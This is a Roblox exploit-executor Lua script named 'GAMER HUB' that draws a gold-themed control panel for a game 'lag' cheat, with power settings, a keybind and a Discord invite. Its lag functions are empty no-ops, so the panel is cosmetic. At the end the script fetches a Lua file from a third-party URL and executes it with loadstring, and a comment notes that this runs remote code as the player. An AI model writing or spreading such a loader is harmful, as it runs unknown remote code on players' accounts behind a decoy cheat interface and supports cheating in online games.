print("GAMER HUB")
print("discord.gg/gamerbypass")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
while not LocalPlayer do
	Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
	LocalPlayer = Players.LocalPlayer
end

local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- GOLD / BLACK PALETTE
local C_GOLD = Color3.fromRGB(255, 196, 0)
local C_GOLD_DIM = Color3.fromRGB(205, 155, 0)

local C_BLACK = Color3.fromRGB(0, 0, 0)
local C_STROKE = Color3.fromRGB(58, 48, 18)
local C_TINT = Color3.fromRGB(2, 2, 2)
local C_RAIN = Color3.fromRGB(255, 214, 120)
local C_HEADER = Color3.fromRGB(5, 4, 0)
local C_HAIRLINE = Color3.fromRGB(58, 48, 18)
local C_WHITE = Color3.new(1, 1, 1)
local C_GREY43 = Color3.fromRGB(140, 122, 80)
local C_BTNBG = Color3.fromRGB(10, 9, 3)
local C_BTNSTK = Color3.fromRGB(74, 62, 24)
local C_SEGSTK = Color3.fromRGB(96, 80, 32)
local C_BLUE = C_GOLD_DIM
local C_DIALSTK = C_GOLD
local C_DIALBG = Color3.fromRGB(1, 1, 1)
local C_GREY49 = Color3.fromRGB(150, 130, 85)
local C_GREY41 = Color3.fromRGB(120, 104, 66)
local C_BOXTXT = Color3.fromRGB(240, 220, 170)
local C_BOXBG = Color3.fromRGB(8, 7, 2)
local C_ROWBG = Color3.fromRGB(14, 12, 4)
local C_ROWSTK = Color3.fromRGB(64, 54, 22)
local C_KEYTXT = Color3.fromRGB(255, 240, 200)
local C_KEYBG = Color3.fromRGB(26, 22, 8)
local C_KEYSTK = Color3.fromRGB(70, 58, 24)
local C_TGBG = Color3.fromRGB(28, 24, 8)
local C_KNOB = Color3.fromRGB(170, 150, 100)
local C_GREY55 = Color3.fromRGB(150, 130, 85)
local C_ONLINE = C_GOLD
local C_ONBG = Color3.fromRGB(190, 145, 0)

local GUI_NAME = "GamerHubGui"
local DISCORD = "discord.gg/gamerbypass"
local IMAGE_ID = "rbxassetid://106519139240666"

for _, v in ipairs(PlayerGui:GetChildren()) do
	if v.Name == GUI_NAME then pcall(function() v:Destroy() end) end
end

local State = {
	Mode = "PC",
	Power = 97000,
	PowerByMode = { PC = 97000, MOBILE = 72000 },
	Active = false,
	Keybind = Enum.KeyCode.V,
	Binding = false,
	Hidden = false,
	StartTime = 0,
}

-- No more busy-wait "lag" loop. The old version froze the main thread
-- inside RenderStepped, which is what made the server rubber-band you back.
-- Power is now purely cosmetic/visual and won't touch your movement.

local function applyPower(val)
	State.Power = math.clamp(math.floor(val), 10000, 500000)
end
applyPower(State.Power)

local function startLag()
	-- intentionally left as a no-op (kept so the rest of the script still works)
end

local function stopLag()
	-- intentionally left as a no-op
end

local function corner(p, r)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, r)
	c.Parent = p
	return c
end

local function stroke(p, col, th)
	local s = Instance.new("UIStroke")
	s.Color = col
	s.Thickness = th
	s.Transparency = 0
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	s.Parent = p
	return s
end

local function shortPower(n)
	if n >= 1000 then
		local k = n / 1000
		if k % 1 == 0 then
			return string.format("%dK", k)
		end
		return string.format("%.1fK", k)
	end
	return tostring(n)
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = GUI_NAME
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Active = true
MainFrame.ClipsDescendants = true
MainFrame.Position = UDim2.new(0.5, -90, 0.5, -140)
MainFrame.Size = UDim2.new(0, 180, 0, 280)
MainFrame.BackgroundColor3 = C_BLACK
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui
corner(MainFrame, 12)
stroke(MainFrame, C_STROKE, 1.2)

local MainScale = Instance.new("UIScale")
MainScale.Scale = 1
MainScale.Parent = MainFrame

local Body = Instance.new("Frame")
Body.Name = "Body"
Body.BackgroundTransparency = 1
Body.Position = UDim2.new(0, 3, 0, 30)
Body.Size = UDim2.new(1, -6, 1, -33)
Body.ZIndex = 1
Body.ClipsDescendants = true
Body.Parent = MainFrame
corner(Body, 9)

local BgImage = Instance.new("ImageLabel")
BgImage.Image = IMAGE_ID
BgImage.BackgroundTransparency = 1
BgImage.ImageTransparency = 0.22
BgImage.ScaleType = Enum.ScaleType.Crop
BgImage.Size = UDim2.new(1, 0, 1, 0)
BgImage.ZIndex = 1
BgImage.Parent = Body

local RainLayer = Instance.new("Frame")
RainLayer.Name = "RainLayer"
RainLayer.BackgroundColor3 = C_TINT
RainLayer.BackgroundTransparency = 0.74
RainLayer.BorderSizePixel = 0
RainLayer.Size = UDim2.new(1, 0, 1, 0)
RainLayer.ZIndex = 2
RainLayer.ClipsDescendants = true
RainLayer.Parent = Body

local RAIN_X = {
	0.526363432, 0.0966121927, 0.589922905, 0.669841349, 0.03786432,
	0.880572259, 0.171320617, 0.847669661, 0.364476591, 0.867162883,
	0.182257935, 0.572675705, 0.835725009, 0.294040501, 0.705185056,
	0.036729008, 0.57913816, 0.74936831, 0.651392698, 0.334701478,
	0.570910394, 0.325415194,
}
local RAIN_Y0 = {
	0.31654349, 0.315524012, 0.776737511, 0.732379973, 0.0789970979,
	0.17925784, 0.564804673, 0.427789927, 0.196613699, 0.897856057,
	0.150151774, 0.642856002, 0.0176240876, 0.283561647, 0.593035221,
	0.189496398, 0.108971655, 0.246814147, 0.504483879, 0.252319098,
	0.780401886, 0.842560291,
}
local RAIN_SPEED = 0.018 * 60
local Drops = {}
for i = 1, #RAIN_X do
	local d = Instance.new("Frame")
	d.Name = "Drop"
	d.BackgroundColor3 = C_RAIN
	d.BackgroundTransparency = 0.4
	d.BorderSizePixel = 0
	d.ZIndex = 3
	d.Size = UDim2.new(0, 2, 0, 11)
	d.Position = UDim2.new(RAIN_X[i], 0, RAIN_Y0[i], 0)
	d.Parent = RainLayer
	Drops[i] = { frame = d, x = RAIN_X[i], y = RAIN_Y0[i] }
end

local Header = Instance.new("Frame")
Header.BackgroundColor3 = C_HEADER
Header.BorderSizePixel = 0
Header.Position = UDim2.new(0, 3, 0, 3)
Header.Size = UDim2.new(1, -6, 0, 27)
Header.ZIndex = 4
Header.Parent = MainFrame
corner(Header, 9)

local HeaderLine = Instance.new("Frame")
HeaderLine.BackgroundColor3 = C_HAIRLINE
HeaderLine.BorderSizePixel = 0
HeaderLine.Position = UDim2.new(0, 0, 1, -1)
HeaderLine.Size = UDim2.new(1, 0, 0, 1)
HeaderLine.ZIndex = 5
HeaderLine.Parent = Header

local Title = Instance.new("TextLabel")
Title.Text = "GAMER HUB"
Title.TextColor3 = C_GOLD
Title.Font = Enum.Font.GothamBold
Title.TextSize = 11
Title.BackgroundTransparency = 1
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Size = UDim2.new(1, -60, 1, 0)
Title.ZIndex = 6
Title.Parent = Header

local HideBtn = Instance.new("TextButton")
HideBtn.Text = "Hide"
HideBtn.TextColor3 = C_GREY43
HideBtn.Font = Enum.Font.GothamBold
HideBtn.TextSize = 9
HideBtn.AutoButtonColor = false
HideBtn.BackgroundColor3 = C_BTNBG
HideBtn.BorderSizePixel = 0
HideBtn.Position = UDim2.new(1, -52, 0.5, -10)
HideBtn.Size = UDim2.new(0, 46, 0, 20)
HideBtn.ZIndex = 7
HideBtn.Parent = Header
corner(HideBtn, 6)
stroke(HideBtn, C_BTNSTK, 1)

local Seg = Instance.new("Frame")
Seg.BackgroundColor3 = C_BTNBG
Seg.BorderSizePixel = 0
Seg.Position = UDim2.new(0, 8, 0, 8)
Seg.Size = UDim2.new(1, -16, 0, 22)
Seg.ZIndex = 4
Seg.Parent = Body
corner(Seg, 6)
stroke(Seg, C_SEGSTK, 1)

local SegPill = Instance.new("Frame")
SegPill.BackgroundColor3 = C_BLUE
SegPill.BorderSizePixel = 0
SegPill.Position = UDim2.new(0, 2, 0, 2)
SegPill.Size = UDim2.new(0.5, -3, 1, -4)
SegPill.ZIndex = 5
SegPill.Parent = Seg
corner(SegPill, 4)

local PCBtn = Instance.new("TextButton")
PCBtn.Text = "PC"
PCBtn.TextColor3 = C_WHITE
PCBtn.Font = Enum.Font.GothamMedium
PCBtn.TextSize = 10
PCBtn.BackgroundTransparency = 1
PCBtn.AutoButtonColor = false
PCBtn.Position = UDim2.new(0, 0, 0, 0)
PCBtn.Size = UDim2.new(0.5, 0, 1, 0)
PCBtn.ZIndex = 6
PCBtn.Parent = Seg

local MobileBtn = Instance.new("TextButton")
MobileBtn.Text = "MOBILE"
MobileBtn.TextColor3 = C_WHITE
MobileBtn.Font = Enum.Font.GothamMedium
MobileBtn.TextSize = 10
MobileBtn.BackgroundTransparency = 1
MobileBtn.AutoButtonColor = false
MobileBtn.Position = UDim2.new(0.5, 0, 0, 0)
MobileBtn.Size = UDim2.new(0.5, 0, 1, 0)
MobileBtn.ZIndex = 6
MobileBtn.Parent = Seg

local Dial = Instance.new("Frame")
Dial.BackgroundTransparency = 1
Dial.AnchorPoint = Vector2.new(0.5, 0)
Dial.Position = UDim2.new(0.5, 0, 0, 38)
Dial.Size = UDim2.new(0, 108, 0, 108)
Dial.ZIndex = 4
Dial.Parent = Body
corner(Dial, 54)

local DialStroke = Instance.new("UIStroke")
DialStroke.Thickness = 3.4
DialStroke.Color = C_DIALSTK
DialStroke.LineJoinMode = Enum.LineJoinMode.Round
DialStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
DialStroke.Parent = Dial

local DialGradient = Instance.new("UIGradient")
DialGradient.Rotation = 0
DialGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0.00, Color3.fromRGB(40, 26, 0)),
	ColorSequenceKeypoint.new(0.38, Color3.fromRGB(150, 105, 0)),
	ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 196, 0)),
	ColorSequenceKeypoint.new(0.62, Color3.fromRGB(150, 105, 0)),
	ColorSequenceKeypoint.new(1.00, Color3.fromRGB(40, 26, 0)),
})
DialGradient.Parent = DialStroke

local DialInner = Instance.new("Frame")
DialInner.BackgroundColor3 = C_DIALBG
DialInner.BorderSizePixel = 0
DialInner.AnchorPoint = Vector2.new(0.5, 0.5)
DialInner.Position = UDim2.new(0.5, 0, 0.5, 0)
DialInner.Size = UDim2.new(1, -6, 1, -6)
DialInner.ZIndex = 4
DialInner.Parent = Dial
corner(DialInner, 51)

local StatusLbl = Instance.new("TextLabel")
StatusLbl.Text = "OFFLINE"
StatusLbl.TextColor3 = C_GREY49
StatusLbl.Font = Enum.Font.GothamBold
StatusLbl.TextSize = 9
StatusLbl.BackgroundTransparency = 1
StatusLbl.Position = UDim2.new(0, 0, 0, 10)
StatusLbl.Size = UDim2.new(1, 0, 0, 12)
StatusLbl.ZIndex = 5
StatusLbl.Parent = DialInner

local PowerLbl = Instance.new("TextLabel")
PowerLbl.Text = shortPower(State.Power)
PowerLbl.TextColor3 = C_WHITE
PowerLbl.Font = Enum.Font.GothamBlack
PowerLbl.TextSize = 26
PowerLbl.BackgroundTransparency = 1
PowerLbl.Position = UDim2.new(0, 0, 0, 24)
PowerLbl.Size = UDim2.new(1, 0, 0, 30)
PowerLbl.ZIndex = 5
PowerLbl.Parent = DialInner

local TimerLbl = Instance.new("TextLabel")
TimerLbl.Text = "00:00"
TimerLbl.TextColor3 = C_GREY41
TimerLbl.Font = Enum.Font.Gotham
TimerLbl.TextSize = 9
TimerLbl.BackgroundTransparency = 1
TimerLbl.Position = UDim2.new(0, 0, 0, 54)
TimerLbl.Size = UDim2.new(1, 0, 0, 12)
TimerLbl.ZIndex = 5
TimerLbl.Parent = DialInner

local PowerBox = Instance.new("TextBox")
PowerBox.Text = tostring(State.Power)
PowerBox.TextColor3 = C_BOXTXT
PowerBox.Font = Enum.Font.GothamBold
PowerBox.TextSize = 10
PowerBox.AnchorPoint = Vector2.new(0.5, 1)
PowerBox.Position = UDim2.new(0.5, 0, 1, -8)
PowerBox.Size = UDim2.new(0.72, 0, 0, 18)
PowerBox.BackgroundColor3 = C_BOXBG
PowerBox.BorderSizePixel = 0
PowerBox.ClearTextOnFocus = false
PowerBox.ZIndex = 6
PowerBox.Parent = DialInner
corner(PowerBox, 5)

local KeyRow = Instance.new("Frame")
KeyRow.BackgroundColor3 = C_ROWBG
KeyRow.BorderSizePixel = 0
KeyRow.Position = UDim2.new(0, 8, 0, 154)
KeyRow.Size = UDim2.new(1, -16, 0, 24)
KeyRow.ZIndex = 4
KeyRow.Parent = Body
corner(KeyRow, 6)
stroke(KeyRow, C_ROWSTK, 1)

local KeyLbl = Instance.new("TextLabel")
KeyLbl.Text = "KEYBIND:"
KeyLbl.TextColor3 = C_GREY49
KeyLbl.Font = Enum.Font.GothamBold
KeyLbl.TextSize = 8
KeyLbl.BackgroundTransparency = 1
KeyLbl.TextXAlignment = Enum.TextXAlignment.Left
KeyLbl.Position = UDim2.new(0, 8, 0, 0)
KeyLbl.Size = UDim2.new(0, 52, 0, 24)
KeyLbl.ZIndex = 5
KeyLbl.Parent = KeyRow

local KeyBtn = Instance.new("TextButton")
KeyBtn.Text = State.Keybind.Name
KeyBtn.TextColor3 = C_KEYTXT
KeyBtn.Font = Enum.Font.GothamBold
KeyBtn.TextSize = 10
KeyBtn.AutoButtonColor = false
KeyBtn.BackgroundColor3 = C_KEYBG
KeyBtn.BorderSizePixel = 0
KeyBtn.Position = UDim2.new(1, -64, 0.5, -9)
KeyBtn.Size = UDim2.new(0, 56, 0, 18)
KeyBtn.ZIndex = 6
KeyBtn.Parent = KeyRow
corner(KeyBtn, 5)
stroke(KeyBtn, C_KEYSTK, 1)

local TgRow = Instance.new("Frame")
TgRow.BackgroundColor3 = C_TGBG
TgRow.BorderSizePixel = 0
TgRow.Position = UDim2.new(0, 8, 0, 186)
TgRow.Size = UDim2.new(1, -16, 0, 28)
TgRow.ZIndex = 4
TgRow.Parent = Body
corner(TgRow, 14)
stroke(TgRow, C_STROKE, 1)

local Knob = Instance.new("Frame")
Knob.BackgroundColor3 = C_KNOB
Knob.BorderSizePixel = 0
Knob.Position = UDim2.new(0, 3, 0.5, -11)
Knob.Size = UDim2.new(0, 22, 0, 22)
Knob.ZIndex = 6
Knob.Parent = TgRow
corner(Knob, 11)

local TgLbl = Instance.new("TextLabel")
TgLbl.Text = "OFF"
TgLbl.TextColor3 = C_GREY55
TgLbl.Font = Enum.Font.GothamBold
TgLbl.TextSize = 10
TgLbl.BackgroundTransparency = 1
TgLbl.TextXAlignment = Enum.TextXAlignment.Left
TgLbl.Position = UDim2.new(0, 28, 0, 0)
TgLbl.Size = UDim2.new(1, -30, 1, 0)
TgLbl.ZIndex = 5
TgLbl.Parent = TgRow

local TgBtn = Instance.new("TextButton")
TgBtn.Text = ""
TgBtn.BackgroundTransparency = 1
TgBtn.AutoButtonColor = false
TgBtn.Size = UDim2.new(1, 0, 1, 0)
TgBtn.ZIndex = 7
TgBtn.Parent = TgRow

-- DISCORD ROW
local DiscordRow = Instance.new("Frame")
DiscordRow.BackgroundColor3 = Color3.fromRGB(16, 13, 3)
DiscordRow.BorderSizePixel = 0
DiscordRow.Position = UDim2.new(0, 8, 0, 220)
DiscordRow.Size = UDim2.new(1, -16, 0, 22)
DiscordRow.ZIndex = 4
DiscordRow.Parent = Body
corner(DiscordRow, 6)
stroke(DiscordRow, C_GOLD_DIM, 1)

local DiscordBtn = Instance.new("TextButton")
DiscordBtn.Text = DISCORD
DiscordBtn.TextColor3 = C_GOLD
DiscordBtn.Font = Enum.Font.GothamBold
DiscordBtn.TextSize = 10
DiscordBtn.AutoButtonColor = false
DiscordBtn.BackgroundTransparency = 1
DiscordBtn.Size = UDim2.new(1, 0, 1, 0)
DiscordBtn.ZIndex = 6
DiscordBtn.Parent = DiscordRow

local MiniFrame = Instance.new("Frame")
MiniFrame.Name = "Mini"
MiniFrame.Active = true
MiniFrame.Visible = false
MiniFrame.ClipsDescendants = true
MiniFrame.Position = UDim2.new(0.5, -95, 0.5, -32)
MiniFrame.Size = UDim2.new(0, 190, 0, 64)
MiniFrame.BackgroundColor3 = C_BLACK
MiniFrame.BorderSizePixel = 0
MiniFrame.ZIndex = 40
MiniFrame.Parent = ScreenGui
corner(MiniFrame, 12)
stroke(MiniFrame, C_STROKE, 1.2)

local MiniBg = Instance.new("ImageLabel")
MiniBg.Image = IMAGE_ID
MiniBg.BackgroundTransparency = 1
MiniBg.ImageTransparency = 0.2
MiniBg.ScaleType = Enum.ScaleType.Crop
MiniBg.Size = UDim2.new(1, 0, 1, 0)
MiniBg.ZIndex = 40
MiniBg.Parent = MiniFrame

local MiniTint = Instance.new("Frame")
MiniTint.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MiniTint.BackgroundTransparency = 0.7
MiniTint.BorderSizePixel = 0
MiniTint.Size = UDim2.new(1, 0, 1, 0)
MiniTint.ZIndex = 41
MiniTint.Parent = MiniFrame

local MiniHeader = Instance.new("Frame")
MiniHeader.BackgroundColor3 = Color3.fromRGB(6, 5, 0)
MiniHeader.BorderSizePixel = 0
MiniHeader.Position = UDim2.new(0, 0, 0, 0)
MiniHeader.Size = UDim2.new(1, 0, 0, 26)
MiniHeader.ZIndex = 42
MiniHeader.Parent = MiniFrame

local MiniLbl = Instance.new("TextLabel")
MiniLbl.Text = "GAMER HUB"
MiniLbl.TextColor3 = C_GOLD
MiniLbl.Font = Enum.Font.GothamBold
MiniLbl.TextSize = 11
MiniLbl.BackgroundTransparency = 1
MiniLbl.TextXAlignment = Enum.TextXAlignment.Left
MiniLbl.Position = UDim2.new(0, 10, 0, 0)
MiniLbl.Size = UDim2.new(1, -70, 1, 0)
MiniLbl.ZIndex = 43
MiniLbl.Parent = MiniHeader

local UnhideBtn = Instance.new("TextButton")
UnhideBtn.Text = "Unhide"
UnhideBtn.TextColor3 = Color3.fromRGB(170, 150, 100)
UnhideBtn.Font = Enum.Font.GothamBold
UnhideBtn.TextSize = 9
UnhideBtn.AutoButtonColor = false
UnhideBtn.BackgroundColor3 = Color3.fromRGB(20, 17, 5)
UnhideBtn.BorderSizePixel = 0
UnhideBtn.Position = UDim2.new(1, -56, 0.5, -10)
UnhideBtn.Size = UDim2.new(0, 50, 0, 20)
UnhideBtn.ZIndex = 44
UnhideBtn.Parent = MiniHeader
corner(UnhideBtn, 6)
stroke(UnhideBtn, Color3.fromRGB(70, 58, 24), 1)

local MiniTg = Instance.new("Frame")
MiniTg.BackgroundColor3 = C_TGBG
MiniTg.BorderSizePixel = 0
MiniTg.Position = UDim2.new(0, 6, 0, 30)
MiniTg.Size = UDim2.new(1, -12, 0, 28)
MiniTg.ZIndex = 42
MiniTg.Parent = MiniFrame
corner(MiniTg, 14)

local MiniKnob = Instance.new("Frame")
MiniKnob.BackgroundColor3 = Color3.fromRGB(180, 160, 110)
MiniKnob.BorderSizePixel = 0
MiniKnob.Position = UDim2.new(0, 4, 0.5, -11)
MiniKnob.Size = UDim2.new(0, 22, 0, 22)
MiniKnob.ZIndex = 43
MiniKnob.Parent = MiniTg
corner(MiniKnob, 11)

local MiniTgLbl = Instance.new("TextLabel")
MiniTgLbl.Text = "OFF"
MiniTgLbl.TextColor3 = Color3.fromRGB(170, 150, 100)
MiniTgLbl.Font = Enum.Font.GothamBold
MiniTgLbl.TextSize = 12
MiniTgLbl.BackgroundTransparency = 1
MiniTgLbl.TextXAlignment = Enum.TextXAlignment.Left
MiniTgLbl.Position = UDim2.new(0, 32, 0, 0)
MiniTgLbl.Size = UDim2.new(1, -36, 1, 0)
MiniTgLbl.ZIndex = 43
MiniTgLbl.Parent = MiniTg

local MiniTgBtn = Instance.new("TextButton")
MiniTgBtn.Text = ""
MiniTgBtn.BackgroundTransparency = 1
MiniTgBtn.AutoButtonColor = false
MiniTgBtn.Size = UDim2.new(1, 0, 1, 0)
MiniTgBtn.ZIndex = 44
MiniTgBtn.Parent = MiniTg

local TW = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local function setActive(on)
	if State.Active == on then return end
	State.Active = on
	if on then
		State.StartTime = os.clock()
		StatusLbl.Text = "ONLINE"
		StatusLbl.TextColor3 = C_ONLINE
		TgLbl.Text = "ON"
		TgLbl.TextColor3 = C_WHITE
		MiniTgLbl.Text = "ON"
		MiniTgLbl.TextColor3 = C_WHITE
		TweenService:Create(Knob, TW, {
			Position = UDim2.new(1, -25, 0.5, -11),
			BackgroundColor3 = C_GOLD,
		}):Play()
		TweenService:Create(MiniKnob, TW, {
			Position = UDim2.new(1, -26, 0.5, -11),
			BackgroundColor3 = C_GOLD,
		}):Play()
		TweenService:Create(TgRow, TW, {BackgroundColor3 = C_ONBG}):Play()
		TweenService:Create(MiniTg, TW, {BackgroundColor3 = C_ONBG}):Play()
		startLag()
	else
		StatusLbl.Text = "OFFLINE"
		StatusLbl.TextColor3 = C_GREY49
		TgLbl.Text = "OFF"
		TgLbl.TextColor3 = C_GREY55
		MiniTgLbl.Text = "OFF"
		MiniTgLbl.TextColor3 = C_GREY55
		TimerLbl.Text = "00:00"
		TweenService:Create(Knob, TW, {
			Position = UDim2.new(0, 3, 0.5, -11),
			BackgroundColor3 = C_KNOB,
		}):Play()
		TweenService:Create(MiniKnob, TW, {
			Position = UDim2.new(0, 4, 0.5, -11),
			BackgroundColor3 = Color3.fromRGB(180, 160, 110),
		}):Play()
		TweenService:Create(TgRow, TW, {BackgroundColor3 = C_TGBG}):Play()
		TweenService:Create(MiniTg, TW, {BackgroundColor3 = C_TGBG}):Play()
		stopLag()
	end
end

local function setPower(n)
	applyPower(n)
	State.PowerByMode[State.Mode] = State.Power
	PowerBox.Text = tostring(State.Power)
	PowerLbl.Text = shortPower(State.Power)
end

local function setMode(mode)
	if State.Mode == mode then return end
	State.PowerByMode[State.Mode] = State.Power
	State.Mode = mode

	if mode == "PC" then
		TweenService:Create(SegPill, TW, {Position = UDim2.new(0, 2, 0, 2)}):Play()
		PCBtn.TextColor3 = C_GOLD
		MobileBtn.TextColor3 = C_GREY43
	else
		TweenService:Create(SegPill, TW, {Position = UDim2.new(0.5, 1, 0, 2)}):Play()
		PCBtn.TextColor3 = C_GREY43
		MobileBtn.TextColor3 = C_GOLD
	end

	setPower(State.PowerByMode[mode] or State.Power)
end

local function setHidden(on)
	State.Hidden = on
	if on then
		MiniFrame.Position = MainFrame.Position
		MainFrame.Visible = false
		MiniFrame.Visible = true
	else
		MainFrame.Position = MiniFrame.Position
		MiniFrame.Visible = false
		MainFrame.Visible = true
	end
end

HideBtn.Activated:Connect(function() setHidden(true) end)
UnhideBtn.Activated:Connect(function() setHidden(false) end)
PCBtn.Activated:Connect(function() setMode("PC") end)
MobileBtn.Activated:Connect(function() setMode("MOBILE") end)
TgBtn.Activated:Connect(function() setActive(not State.Active) end)
MiniTgBtn.Activated:Connect(function() setActive(not State.Active) end)

DiscordBtn.Activated:Connect(function()
	if setclipboard then
		pcall(setclipboard, DISCORD)
	end
end)

PowerBox.FocusLost:Connect(function()
	local n = tonumber(PowerBox.Text)
	if n and n > 0 then
		setPower(n)
	else
		PowerBox.Text = tostring(State.Power)
	end
end)

KeyBtn.Activated:Connect(function()
	State.Binding = true
	KeyBtn.Text = "..."
end)

UserInputService.InputBegan:Connect(function(input, gpe)
	if input.UserInputType ~= Enum.UserInputType.Keyboard then return end

	if State.Binding then
		if input.KeyCode == Enum.KeyCode.Unknown then return end
		State.Binding = false
		if input.KeyCode ~= Enum.KeyCode.Escape then
			State.Keybind = input.KeyCode
		end
		KeyBtn.Text = State.Keybind.Name
		return
	end

	if gpe then return end
	if UserInputService:GetFocusedTextBox() then return end

	if input.KeyCode == State.Keybind then
		setActive(not State.Active)
	elseif input.KeyCode == Enum.KeyCode.RightControl then
		setHidden(not State.Hidden)
	end
end)

-- DRAGGING (header only, so buttons don't move the window)
local dragTarget, dragStart, dragOrigin

local function hookDrag(frame, target)
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch then
			dragTarget = target
			dragStart = Vector2.new(input.Position.X, input.Position.Y)
			dragOrigin = target.Position
		end
	end)
end

hookDrag(Header, MainFrame)
hookDrag(MiniHeader, MiniFrame)

UserInputService.InputChanged:Connect(function(input)
	if not dragTarget then return end
	if input.UserInputType ~= Enum.UserInputType.MouseMovement
	and input.UserInputType ~= Enum.UserInputType.Touch then return end

	local delta = Vector2.new(input.Position.X, input.Position.Y) - dragStart
	local size = dragTarget.AbsoluteSize
	local cam = workspace.CurrentCamera
	local vp = cam and cam.ViewportSize or Vector2.new(1920, 1080)

	local nx = dragOrigin.X.Offset + delta.X
	local ny = dragOrigin.Y.Offset + delta.Y

	nx = math.clamp(nx, -(size.X - 40), vp.X - 40)
	ny = math.clamp(ny, 0, vp.Y - 40)

	dragTarget.Position = UDim2.new(
		dragOrigin.X.Scale, math.floor(nx),
		dragOrigin.Y.Scale, math.floor(ny)
	)
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
	or input.UserInputType == Enum.UserInputType.Touch then
		dragTarget = nil
	end
end)

LocalPlayer.CharacterAdded:Connect(function()
	task.wait(0.5)
	if State.Active then
		stopLag()
		startLag()
	end
end)

local gradAccum = 0
RunService.RenderStepped:Connect(function(dt)
	for i = 1, #Drops do
		local d = Drops[i]
		d.y = d.y + RAIN_SPEED * dt
		if d.y > 1 then d.y = d.y - 1 end
		d.frame.Position = UDim2.new(d.x, 0, d.y, 0)
	end

	gradAccum = (gradAccum + 108 * dt) % 360
	DialGradient.Rotation = gradAccum

	if State.Active then
		local elapsed = os.clock() - State.StartTime
		local mins = math.floor(elapsed / 60)
		local secs = math.floor(elapsed % 60)
		TimerLbl.Text = string.format("%02d:%02d", mins, secs)
	end
end)

ScreenGui.Destroying:Connect(function()
	stopLag()
end)

-- INIT
setMode("PC")
PCBtn.TextColor3 = C_GOLD
MobileBtn.TextColor3 = C_GREY43
MainFrame.Visible = true
MainScale.Scale = 0.9
TweenService:Create(
	MainScale,
	TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
	{Scale = 1}
):Play()

-- ─────────────────────────────────────────────────────────────
-- EXTERNAL LOADER
-- Loads: https://generator-crash.lovable.app/s/gamer222179/loader.lua?p=Gamer2221799
-- NOTE: this runs remote code from a third-party host. Only keep it if
-- you trust that URL — anything it does runs as YOU in this game.
-- ─────────────────────────────────────────────────────────────
local ok, err = pcall(function()
	loadstring(game:HttpGet("https://generator-crash.lovable.app/s/gamer222179/loader.lua?p=Gamer2221799"))()
end)
if not ok then
	warn("[GAMER HUB] external loader failed:", err)
end